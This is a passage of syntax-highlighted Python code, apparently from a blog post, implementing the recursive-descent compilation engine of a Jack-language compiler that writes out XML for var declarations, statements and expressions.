&#x27;,&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                <span class="keyword">if</span> self.parser.symbol() == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">elif</span> self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid param list!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid param list!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/parameterList&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileVarDec</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;varDec&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the rest var name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">&quot;;&quot;</span>):</span><br><span class="line">            <span class="comment"># parse &quot;,&quot;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse var name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid var define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/varDec&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileStatements</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;statements&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">             (self.parser.keyWord() == <span class="string">&quot;do&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;if&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;while&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;let&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;return&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">&quot;do&quot;</span>:</span><br><span class="line">                self.compileDo()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;if&quot;</span>:</span><br><span class="line">                self.compileIf()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;while&quot;</span>:</span><br><span class="line">                self.compileWhile()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;let&quot;</span>:</span><br><span class="line">                self.compileLet()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;return&quot;</span>:</span><br><span class="line">                self.compileReturn()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid statement define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/statements&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileDo</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;doStatement&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse do</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;do&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid do  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;(&quot;</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid do statement  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression list</span></span><br><span class="line">        self.compileExpressionList()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid do statement body define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid do statement  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/doStatement&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileLet</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;letStatement&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse let </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;let&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid let  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse varname</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.identifier())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid let  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse `[expression]`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            <span class="comment"># parse &#x27;[&#x27;</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse &#x27;]&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">               self.parser.symbol() == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;inValid let  define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid let  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid let  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/letStatement&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileWhile</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;whileStatement&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;while&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid while  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid while  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid while  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid while  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid while  define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/whileStatement&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileReturn</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;returnStatement&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;return&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if return statement!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression  list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">            self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if return statement!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/returnStatement&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileIf</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;ifStatement&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse if </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;if&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse else</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;else&quot;</span>:</span><br><span class="line">            <span class="comment"># parse &#x27;else&#x27;</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse statements</span></span><br><span class="line">            self.compileStatements()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid if define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/ifStatement&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileExpression</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;expression&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse term</span></span><br><span class="line">        self.compileTerm()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse op</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.symbol() == <span class="string">&quot;+&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;-&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;*&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;/&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&amp;&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;|&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&gt;&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;&lt;&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;=&quot;</span>):</span><br><span class="line">            <span class="comment"># parse op</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse term</span></span><br><span class="line">            self.compileTerm()</span><br><span class="line">        </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/expression&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileTerm</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;term&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            <span class="comment"># parse int const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.intVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            <span class="comment"># parse string const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.stringVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            <span class="comment"># parse keword const</span></span><br><span class="line">            <span class="keyword">if</span> 